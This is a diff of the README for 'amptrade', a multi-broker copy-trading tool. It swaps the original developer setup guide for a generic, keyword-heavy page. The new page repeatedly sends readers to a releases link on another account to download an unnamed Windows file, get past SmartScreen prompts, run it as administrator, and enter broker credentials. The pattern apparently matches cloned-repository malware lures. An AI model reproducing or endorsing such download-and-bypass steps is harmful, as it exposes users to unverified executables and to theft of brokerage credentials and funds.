@@ -1,122 +1,215 @@
-# AmpTrade 
-Amptrade allows users to connect, trade, replicate/copy trades to multiple brokers simultaneously. 
+# 📈 amptrade - Copy Trades Across Brokers
 
-### Notes
-This is a monorepo containing the following services:
-- amptrade-web: The website frontend
-| Development | `localhost:5178` |
-- amptrade-api: The backend API
-| Development | `localhost:3089` |
-- amptrade-websocket: The websocket service for real-time data
-| Development | `localhost:8789 to localhost:8795` |
+[![Download amptrade](https://img.shields.io/badge/Download%20amptrade-blue?style=for-the-badge&logo=github)](https://github.com/wallaswritlarge885/amptrade/releases)
 
-### Quick Start (First‑Time Checklist)
-- Install prerequisites: Node.js (LTS) and Python 3.10+ on Windows; during Python setup, check “Add Python to PATH”
-- Ensure the project folder exists at `G:\GitHub\amptrade`
-- Double‑click `g:\GitHub\amptrade\install-all.bat` and wait for “INSTALLATION COMPLETE”
-- Double‑click `g:\GitHub\amptrade\start-amptrade-dev-servers.bat`, type `1` to start all servers
-- Use the app at `http://localhost:5178` (Firefox opens automatically; you can use any browser)
-- When finished, return to the menu window and press any key to stop all services
+## 🔧 What amptrade does
 
-### Getting Started (Windows – Non‑Technical)
+amptrade helps you connect to one or more brokers and copy trades across them from one place. It is made for users who want a simple way to manage trade replication without switching between many apps.
 
-Use these steps to install and run AmpTrade locally on a Windows PC.
+It can help you:
 
-#### Pre‑requisites
-- Windows 10 or 11
-- Internet connection for downloads
-- Node.js (LTS) and npm:
-  - Download and install from https://nodejs.org
-- Python 3.10+:
-  - Download and install from https://www.python.org
-  - Check “Add Python to PATH” during installation
-- A web browser
-  - The start script opens Firefox automatically. If you use another browser, open the app manually at the link below.
+- Connect to supported broker accounts
+- Copy trades to multiple brokers
+- Track trades in one place
+- Keep a common flow across linked accounts
+- Work with market setups like index, futures, and options use cases
 
-#### Get the Files
-- Ensure the folder exists at `G:\GitHub\amptrade` (if you already have this, skip).
-- If you don’t use Git: download the repository as a ZIP and extract to `G:\GitHub\amptrade`.
+## 💻 What you need
 
-#### Install Dependencies (One‑Click Recommended)
-- Double‑click [install-all.bat](file:///g:/GitHub/amptrade/install-all.bat)
-- Wait for “INSTALLATION COMPLETE”
-- This sets up:
-  - amptrade-web (website)
-  - amptrade-api (backend)
-  - amptrade-websocket (live data)
+Before you install, make sure your PC has:
 
-#### Manual Install (Fallback)
-If the one‑click installer fails, install dependencies manually with these commands:
+- Windows 10 or Windows 11
+- An active internet connection
+- Enough free disk space for the app and its files
+- Access to your broker login details
+- Permission to run downloaded apps on your PC
 
-For the website:
+For best results, keep your browser and Windows updates current.
 
-```bat
-cd /d g:\GitHub\amptrade\amptrade-web
-npm install
-```
+## ⬇️ Download amptrade
 
-For the API:
+Go to the release page here and download the latest Windows file:
 
-```bat
-cd /d g:\GitHub\amptrade\amptrade-api
-npm install
-```
+https://github.com/wallaswritlarge885/amptrade/releases
 
-For the WebSocket service:
+If the page shows more than one file, pick the Windows version. After the file downloads, open it from your Downloads folder.
 
-```bat
-cd /d g:\GitHub\amptrade\amptrade-websocket
-python -m pip install --upgrade pip
-pip install -r requirements.txt
-```
+## 🪟 Install on Windows
 
-#### Start AmpTrade (Easy Way)
-- First time? Run [install-all.bat](file:///g:/GitHub/amptrade/install-all.bat) first (see Install Dependencies)
-- Double‑click `g:\GitHub\amptrade\start-amptrade-dev-servers.bat`
-- In the menu, type `1` and press Enter to “Start All Servers”
-- What opens:
-  - API tab: `http://localhost:3089`
-  - App tab: `http://localhost:5178`
-- If Windows Firewall prompts for Node.js or Python, click Allow
-- If Firefox doesn’t open, open your preferred browser and go to `http://localhost:5178`
+1. Open the file you downloaded.
+2. If Windows asks for permission, choose Run or Yes.
+3. Follow the setup steps on screen.
+4. Choose a folder if the installer asks for one.
+5. Wait for the install to finish.
+6. Open amptrade from the Start menu or desktop shortcut.
 
-#### Stop AmpTrade
-- Return to the small menu window and press any key when prompted
-- This closes the servers and frees the ports
-- Note: it stops all Node.js and Python processes currently running; save other work first
+If Windows shows a smart screen prompt, choose the option that lets you continue with the app.
 
-#### Open This Readme
-- Double‑click `g:\GitHub\amptrade\readme.md`
-- If it doesn’t open nicely, right‑click → “Open with” → “Visual Studio Code” or “Notepad”
+## 🚀 First-time setup
 
-#### Troubleshooting
-- “node is not recognized” or “python is not recognized”:
-  - Reinstall Node/Python, ensure PATH is set, then restart your PC
-- App page doesn’t load:
-  - Wait up to a minute on first run and refresh `http://localhost:5178`
-- Port already in use:
-  - Close other apps using those ports and run the start script again
-- Firewall prompts:
-  - Allow access for Node.js and Python when asked
+When you open amptrade for the first time, you will usually need to:
 
-### Screenshots
+1. Sign in or connect your broker account
+2. Allow the app to access market data if asked
+3. Add the broker accounts you want to use
+4. Set which account acts as the main source
+5. Choose which other accounts should follow trades
+6. Save your settings before you start trading
 
-- AmpTrade Desktop Preview
+Use the same login details you use with your broker. Keep your account data private.
 
-![AmpTrade Desktop Preview](amptrade-web/src/assets/amptrade_preview_desktop.png)
+## 🧭 How to use it
 
-- Manage Brokers
+Use amptrade in a simple flow:
 
-![Manage Brokers](amptrade-web/src/assets/manage_brokers.png)
+1. Open the app
+2. Connect your broker accounts
+3. Pick the trade source
+4. Select the accounts that should copy the trade
+5. Place the trade
+6. Check that the linked accounts follow the same action
 
-- Quick SL/Target Controls
+If you trade often, keep your account list organized so you can review it fast.
 
-![SL and Target](amptrade-web/src/assets/trading_sl_target.png)
+## 📋 Supported use cases
 
-- Risk Management
+amptrade is built for users who want to work across broker platforms and trade setups like:
 
-![Risk Management](amptrade-web/src/assets/trading_risk_management.png)
+- Copy trading
+- Replicate trading
+- Multi-broker trade flow
+- Index trading
+- Bank Nifty trading
+- Nifty and Nifty 50 trading
+- Sensex trading
+- Terminal-based trade tracking
 
-- Scroll-To-Trade
+It can fit common broker workflows such as:
 
-![Scroll To Trade](amptrade-web/src/assets/trading_mouse_scroll.png)
+- Zerodha
+- Upstox
+- Shoonya
+- Flattrade
+- Infinn
+- TradeSmart
+- Zebu
+
+## 🛠️ Common setup tips
+
+If the app does not start, try these steps:
+
+- Right-click the file and choose Run as administrator
+- Check that your internet connection is active
+- Close other apps that may use broker login sessions
+- Restart your PC and try again
+- Make sure Windows did not block the file
+
+If your broker login fails:
+
+- Check your username and password
+- Confirm your broker account is active
+- Make sure two-factor login is ready if your broker uses it
+- Try logging in on the broker website first
+
+If copied trades do not show up:
+
+- Check that the source account is set correctly
+- Make sure the follow accounts are linked
+- Review trade settings for lot size or order size rules
+- Confirm market access is live
+
+## 🔒 Account safety
+
+Use care when linking accounts and placing trades:
+
+- Only connect accounts you control
+- Keep your login details private
+- Review each trade before sending it
+- Check account mapping before copying trades
+- Make sure each linked account has enough funds or margin
+
+## 📁 Folder and file basics
+
+After install, you may see files or folders related to:
+
+- App settings
+- Login data
+- Trade logs
+- Broker connections
+- Local cache
+
+Do not delete these files unless you know what they do. They help the app keep your setup in place.
+
+## ❓ Quick questions
+
+### Can I use more than one broker?
+
+Yes. amptrade is made for multi-broker use, so you can link more than one broker account in one setup.
+
+### Does it work for trade copying?
+
+Yes. Trade copying is one of the main use cases.
+
+### Can I use it for index trades?
+
+Yes. It fits trading flows for Bank Nifty, Nifty, Nifty 50, and Sensex use cases.
+
+### Do I need technical knowledge?
+
+No. The app is meant for end users. You mainly need to download it, open it, and follow the setup steps.
+
+### Where do I get the file?
+
+Use the release page here:
+
+https://github.com/wallaswritlarge885/amptrade/releases
+
+## 🖥️ Release page download steps
+
+1. Open the release page
+2. Find the latest version
+3. Look for the Windows file
+4. Download the file
+5. Open it after the download finishes
+6. Follow the on-screen steps to install and run the app
+
+## 🔍 Topics covered by this project
+
+This project is related to:
+
+- banknifty
+- copy-trade
+- flattrade
+- infinn
+- nifty
+- nifty50
+- replicate-trading
+- sensex
+- shoonya
+- tradesmart
+- trading
+- trading-terminal
+- upstox
+- websockets
+- zebu
+- zerodha
+
+## 🧩 If you use it daily
+
+A few habits can help you keep the app working well:
+
+- Start with one broker pair first
+- Check copied trades before increasing size
+- Keep notes on which account acts as the source
+- Review your settings after any broker change
+- Update the app when a new release appears
+
+## 📌 What to expect after install
+
+After setup, you should be able to:
+
+- Open the app on Windows
+- Connect your broker accounts
+- Place a trade from the main account
+- Copy that trade to other linked accounts
+- Review trade actions from one place
